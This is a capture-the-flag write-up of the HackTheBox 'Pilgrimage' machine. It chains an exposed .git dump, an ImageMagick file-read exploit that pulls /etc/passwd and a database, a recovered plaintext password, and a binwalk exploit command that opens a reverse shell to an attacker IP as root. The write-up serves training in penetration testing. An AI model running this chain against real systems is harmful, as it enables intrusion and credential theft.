---
title: Pilgrimage
tags:

  - ImageMagick
date: 2025-05-28T00:00:01Z
---
![](Pasted%20image%2020250528213016.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.219 pilgrimage.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- pilgrimage.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http
|_http-title: Pilgrimage - Shrink Your Images
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name
 the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please
 ...
```

Nmap reports a hidden endpoint `/.git` so there might be a git repository exposed. I checked its website:

![](Pasted%20image%2020250528213026.png)

I'll use **git-dumper** to dump the content of the hidden repository:

```shell
# First I activate my Python venv
source ~/HackTheBox/hackthebox_env/bin/activate
# Then I executed it
git-dumper http://pilgrimage.htb/.git/ ./results
```

I noticed that inside of the repository there is an ELF binary called `magick`. It makes reference to [ImageMagick](https://imagemagick.org/). So I checked its version:

```shell
./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

## Weaponization

I searched for "ImageMagick 7.1.0-49" cve and found [CVE-2022-44268](https://git.rotfl.io/v/CVE-2022-44268).

## Exploitation

First I cloned the repository:

```shell
git clone https://github.com/voidz0r/CVE-2022-44268
```

Then I run the project to create the image:

```shell
cargo run "/etc/passwd"
```

Then I used the generated file to upload it to the website:

![](Pasted%20image%2020250528213035.png)

Afterwards I downloaded the generated image and analyzed it with ImageMagick:

```shell
../magick identify -verbose ../../683754fdf0f73.png

[redacted]
```

Then I decode it from hex:

```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

emily:x:1000:1000:emily,,,:/home/emily:/bin/bash

sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Username `emily` is found.

As we can successfully read files in the machine, we can try to search for databases. In Code-OSS, I can search for databases leaked on the source code:

![](Pasted%20image%2020250528213052.png)

There is a database under `/var/db/pilgrimage`, so I'll repeat the process but for the database:

```shell
cargo run "/var/db/pilgrimage"
# Upload the image to the website
# Download it
../magick identify -verbose ../../683756a3cf065.png

[redacted]
```

```python
# Clean and convert to binary
hex_data = hex_data.replace("\n", "").replace(" ", "")
binary_data = binascii.unhexlify(hex_data)

# Save it as sqlite
with open("database.sqlite", "wb") as f:
    f.write(binary_data)

print("Saved")
```

![](Pasted%20image%2020250528213112.png)

> Got creds: `emily:abigchonkyboi123`

### User flag

![](Pasted%20image%2020250528213118.png)

## Privilege Escalation

I enumerated `root`'s processes:

```shell
ps auxww | grep root

[redacted]
root         773  0.0  0.0   2516   716 ?        S    03:55   0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/

root         774  0.0  0.0   6816  2296 ?        S    03:55   0:00 /bin/bash /usr/sbin/malwarescan.sh
```

I noticed a Bash script called `malwarescan.sh` being executed by root and likely calling the `inotifywait` command. I took a closer look to the script:

```bash
cat /usr/sbin/malwarescan.sh

#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

The script uses inotifywait to monitor the /var/www/pilgrimage.htb/shrunk/ directory for new files. When a new file is created, the script uses tail and sed to extract the filename from the output of inotifywait . Then, binwalk is used to extract any binary data and store it in the binout variable. If any of the blacklisted strings are found, the file is removed.

I decided to take a look at the binwal version to find out any vulnerability it could have:

```shell
/usr/local/bin/binwalk

Binwalk v2.3.2
```

## Weaponization x2

So I searched for "binwalk 2.3.2 cve" and found [CVE-2022-4510](https://www.exploit-db.com/exploits/51249)

## Exploitation x2

I copied the code and executed the script:
- NOTE: I manually uploaded the funny.png.

```shell
python3 cve_escalation.py funny.jpg 10.10.14.36 888
# Then move the generated file to /var/www/pilgrimage.htb/shrunk (as the code requires)
mv binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
```

After a few seconds you'll get a shell as root:

![](Pasted%20image%2020250528213130.png)

### Root flag
